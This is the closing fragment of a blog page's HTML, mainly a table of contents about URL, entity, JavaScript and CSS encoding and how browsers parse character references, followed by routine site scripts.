href=#url-enocde>URL Enocde</a></li><li><a href=#character-entity>Character Entity</a><ol><li><a href=#实体名称>实体名称</a></li><li><a href=#实体编号>实体编号</a></li></ol></li><li><a href=#javascript-encode>Javascript Encode</a></li><li><a href=#css-encode>CSS Encode</a></li><li><a href=#javascript-内置的编码函数>Javascript 内置的编码函数</a></li></ol></li><li><a href=#render>Render</a><ol><li><a href=#原理>原理</a></li><li><a href=#三种状态>三种状态</a><ol><li><a href=#数据状态中的字符引用>数据状态中的字符引用</a></li><li><a href=#rcdata-状态中的字符引用>RCDATA 状态中的字符引用</a></li><li><a href=#属性值状态中的字符引用>属性值状态中的字符引用</a></li></ol></li><li><a href=#javascript-解析>Javascript 解析</a><ol><li><a href=#字符串中>字符串中</a></li><li><a href=#标识符名称中>标识符名称中</a></li><li><a href=#控制字符>控制字符</a></li></ol></li><li><a href=#example>Example</a><ol><li><a href=#example-1>Example 1</a></li><li><a href=#example-2>Example 2</a></li><li><a href=#example-3>Example 3</a></li><li><a href=#example-4>Example 4</a></li><li><a href=#example-5>Example 5</a></li></ol></li><li><a href=#examples>Examples</a></li></ol></li><li><a href=#reference>Reference</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>